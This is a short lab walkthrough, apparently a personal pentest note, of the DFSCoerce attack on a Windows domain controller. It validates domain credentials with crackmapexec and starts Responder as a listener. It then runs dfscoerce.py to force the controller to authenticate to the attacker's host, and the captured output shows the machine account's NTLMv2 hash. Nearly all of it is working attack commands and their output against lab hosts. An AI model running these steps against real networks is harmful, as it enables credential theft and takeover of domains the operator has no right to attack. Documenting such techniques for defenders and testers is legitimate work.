# link

https://github.com/Wh04m1001/DFSCoerce

# steps

## 1

require a valid domain credentials, doesn't have to be administrator


	┌──(kali㉿kali)-[~/Desktop]
	└─$ crackmapexec smb 192.168.200.100 -u testuser -p 'Pass123!' -d valhalla
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [+] valhalla\testuser:Pass123!


## 2
Start listener (Responder)

	┌──(kali㉿kali)-[~/Desktop]
	└─$ sudo /usr/share/responder/Responder.py -I eth0
	[sudo] password for kali: 
	                                         __
	  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
	  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
	  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
	                   |__|
	
	           NBT-NS, LLMNR & MDNS Responder 3.1.1.0
	
	  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
	  To kill this script hit CTRL-C


## 3
Run coerce script


	┌──(kali㉿kali)-[~/Desktop/DFSCoerce]
	└─$ python dfscoerce.py -u testuser -p 'Pass123!' -d valhalla -dc-ip 192.168.200.100 192.168.200.126 192.168.200.100
	[-] Connecting to ncacn_np:192.168.200.100[\PIPE\netdfs]
	[+] Successfully bound!
	[-] Sending NetrDfsRemoveStdRoot!
	NetrDfsRemoveStdRoot 
	ServerName:                      '192.168.200.126\x00' 
	RootShare:                       'test\x00' 
	ApiFlags:                        1 
	
	
	DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 


## 4

check Responder

	[HTTP] User-Agent        : WinHttp-Autoproxy-Service/5.1
	[HTTP] User-Agent        : WinHttp-Autoproxy-Service/5.1
	[SMB] NTLMv2-SSP Client   : ::ffff:192.168.200.100
	[SMB] NTLMv2-SSP Username : VALHALLA\ODIN$
	[SMB] NTLMv2-SSP Hash     : ODIN$::VALHALLA:9a0efe77d6fb6a0a:577378819C056A02F5582B21DD363B28:01010000000000000058F03C6F9FD80158............003600000000000000000000000000                                                                                                             
	[*] Skipping previously captured hash for VALHALLA\ODIN$
	[*] Skipping previously captured hash for VALHALLA\ODIN$
	
